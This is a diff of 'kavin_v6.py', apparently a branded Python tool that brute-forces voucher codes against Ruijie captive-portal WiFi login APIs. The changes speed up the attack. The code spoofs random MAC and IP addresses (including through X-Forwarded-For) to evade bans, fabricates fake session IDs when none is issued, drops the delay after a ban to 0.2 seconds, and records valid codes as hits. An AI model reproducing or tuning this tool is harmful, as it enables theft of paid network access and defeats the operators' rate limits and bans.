@@ -1,5 +1,5 @@
 # =====================================================================
-# kavin_v6.py - KAVIN FAST SPEED V6 (Error/Debug Ready)
+# kavin_v6.py - KAVIN FAST SPEED V6 (V15 Speed Logic Fixed)
 # Part 1 of 2
 # =====================================================================
 
@@ -135,54 +135,49 @@ def auto_detect_portal():
     return None
 
 # ============================================================
-#  SESSION FETCH (Error Details & Fake Session)
+#  SESSION FETCH (V15 အတိုင်း အတု ပြန်ထည့်ထားသည်)
 # ============================================================
 async def fetch_official_session(session, gw_params, current_mac_ref, current_ip_ref):
     base = RUIJIE_WIFIDOG
     if "portal-mm-as" in str(gw_params.get("url", "")):
         base = base.replace("portal-as", "portal-mm-as")
 
-    attempt = 0
-    while attempt < 3: 
-        attempt += 1
-        temp_params = dict(gw_params)
-        temp_params['mac'] = current_mac_ref[0]
-        temp_params['ip'] = current_ip_ref[0]
+    temp_params = dict(gw_params)
+    temp_params['mac'] = current_mac_ref[0]
+    temp_params['ip'] = current_ip_ref[0]
 
-        params_str = "&".join([f"{k}={quote(str(v))}" for k, v in temp_params.items()])
-        full_url = f"{base}?{params_str}"
+    params_str = "&".join([f"{k}={quote(str(v))}" for k, v in temp_params.items()])
+    full_url = f"{base}?{params_str}"
 
-        headers = {
-            'User-Agent': f'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Dragon-{current_mac_ref[0]}',
-            'Client-Mac': current_mac_ref[0],
-            'X-Forwarded-For': current_ip_ref[0],
-            'Connection': 'close'
-        }
+    headers = {
+        'User-Agent': f'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Dragon-{current_mac_ref[0]}',
+        'Client-Mac': current_mac_ref[0],
+        'X-Forwarded-For': current_ip_ref[0],
+        'Connection': 'close'
+    }
 
-        try:
-            session.cookie_jar.clear()
-            async with session.get(full_url, headers=headers, timeout=5, allow_redirects=False) as resp:
-                location = resp.headers.get('Location', '')
-                
-                if location:
-                    loc_lower = location.lower()
-                    if ("request limited" in loc_lower or "error.html" in loc_lower or "errormsg" in loc_lower or "banned" in loc_lower):
-                        return "BAN", "Banned"
-
-                    q = parse_qs(urlparse(location).query)
-                    sid = q.get('sessionId', [None])[0]
-                    if sid:
-                        return {
-                            'sessionId': sid,
-                            'sign': q.get('sign', [None])[0],
-                            'timestamp': q.get('timestamp', [None])[0],
-                        }, "OK"
-        except Exception as e:
-            pass
+    try:
+        session.cookie_jar.clear()
+        async with session.get(full_url, headers=headers, timeout=10, allow_redirects=False) as resp:
+            location = resp.headers.get('Location', '')
             
-        await asyncio.sleep(0.2)
+            if location:
+                loc_lower = location.lower()
+                if ("request limited" in loc_lower or "error.html" in loc_lower or "errormsg" in loc_lower or "banned" in loc_lower):
+                    return "BAN", "Banned"
 
-    # V15 လိုပဲ Session မရရင် Fake Session ပေးလိုက်မယ်
+                q = parse_qs(urlparse(location).query)
+                sid = q.get('sessionId', [None])[0]
+                if sid:
+                    return {
+                        'sessionId': sid,
+                        'sign': q.get('sign', [None])[0],
+                        'timestamp': q.get('timestamp', [None])[0],
+                    }, "OK"
+    except Exception:
+        pass
+
+    # V15 လိုပဲ မရရင် Fake Session ပြန်ပေးမယ်
     return {
         'sessionId': f"fake_sess_{random.randint(1000,9999)}",
         'sign': None,
@@ -211,7 +206,7 @@ async def test_code_official(session, sess_data, code, mac, ip):
     if sess_data.get('timestamp'): payload["timestamp"] = sess_data['timestamp']
 
     try:
-        async with session.post(url, json=payload, headers=headers, timeout=5, ssl=False, allow_redirects=True) as r:
+        async with session.post(url, json=payload, headers=headers, timeout=10, ssl=False, allow_redirects=True) as r:
             if r.status == 429: return "__RATE_LIMITED__", "1HR"
 
             text = await r.text()
@@ -229,7 +224,7 @@ async def test_code_official(session, sess_data, code, mac, ip):
 
             return text, plan
     except asyncio.TimeoutError: return "__TIMEOUT__", "1HR"
-    except aiohttp.ClientError as e: return f"__ERROR__:Net", "1HR"
+    except aiohttp.ClientError: return "__NETWORK_ERROR__", "1HR"
     except Exception as e: return f"__ERROR__:{type(e).__name__}", "1HR"
 
 # ============================================================
@@ -262,7 +257,7 @@ def gen_code(mode, length, scan_method="random"):
     except Exception: pass
     return ""
 # =====================================================================
-# kavin_v6.py - KAVIN FAST SPEED V6 (Error/Debug Ready)
+# kavin_v6.py - KAVIN FAST SPEED V6 (V15 Speed Logic Fixed)
 # Part 2 of 2
 # =====================================================================
 
@@ -278,8 +273,7 @@ def get_dashboard_renderable(mode, scan_method, current_code, tested, elapsed, s
     stats.add_column(style="bold white", justify="left")
     stats.add_column(style="bold green", justify="left")
 
-    # Error ဖြစ်နေရင် အနီရောင်နဲ့ ပြမယ်
-    status_style = "bold red" if "ERR" in status.upper() or "TIMEOUT" in status.upper() or "BAN" in status.upper() or "RETRY" in status.upper() else "bold green"
+    status_style = "bold red" if "ERR" in status.upper() or "TIMEOUT" in status.upper() or "BAN" in status.upper() or "RETRY" in status.upper() or "FAIL" in status.upper() else "bold green"
 
     stats.add_row("  📅 Expiry", f": {LICENSE_INFO['status']}", "  ⏱ Timer", f": {elapsed}")
     stats.add_row("  🎯 Mode",   f": {mode.upper()}",           "  📊 Tested", f": {tested:,}")
@@ -299,7 +293,7 @@ def get_dashboard_renderable(mode, scan_method, current_code, tested, elapsed, s
     for h in hits[-10:]:
         v_table.add_row(h.get('code', ''), h.get('plan', '1HR'), "Active")
 
-    if not hits: v_table.add_row("[dim]KAVIN FAST SPEED V6 • Fresh Start per Run[/dim]", "", "")
+    if not hits: v_table.add_row("[dim]KAVIN FAST SPEED V6 • V15 Speed Logic[/dim]", "", "")
 
     footer_text = Text.assemble(("✨ Thank You For Choosing @kavin799 Tools ✨", "bold bright_yellow"))
     footer_panel = Panel(Align.center(footer_text), border_style="red", box=ROUNDED, height=3)
@@ -342,14 +336,14 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
             try:
                 while True:
                     if sess_data[0] is None:
-                        current_status[0] = "Session..."
+                        current_status[0] = "Session"
                         res, err_msg = await fetch_official_session(session, gw_params, current_mac, current_ip)
 
                         if res == "BAN":
                             current_status[0] = "Banned → Spoof"
                             current_mac[0] = generate_random_mac()
                             current_ip[0]  = generate_random_ip()
-                            await asyncio.sleep(RATE_LIMIT_SLEEP)
+                            await asyncio.sleep(0.2)
                             continue
 
                         sess_data[0] = res
@@ -390,7 +384,7 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                             break
 
                         if res.startswith("__ERROR__:") or res in ("__TIMEOUT__", "__NETWORK_ERROR__"):
-                            current_status[0] = f"ERR: {res.replace('__', '')}" # Error ကို ပြမယ်
+                            current_status[0] = f"ERR: Net"
                             continue
 
                         low = res.lower()
@@ -440,15 +434,12 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                 live.stop()
                 console.print(f"\n[bold red]Fatal Error: {e}[/bold red]")
 
-# ============================================================
-#  UI / MENU
-# ============================================================
 def show_banner():
     clear_screen()
     console.print()
     console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
     console.print(Text("⚡ KAVIN FAST SPEED V6 ⚡", style="bold bright_white"), justify="center")
-    console.print(Text("Official Ruijie API • Auto-Detect", style="bold bright_yellow"), justify="center")
+    console.print(Text("Official Ruijie API • V15 Speed Logic", style="bold bright_yellow"), justify="center")
     console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
     console.print()
 
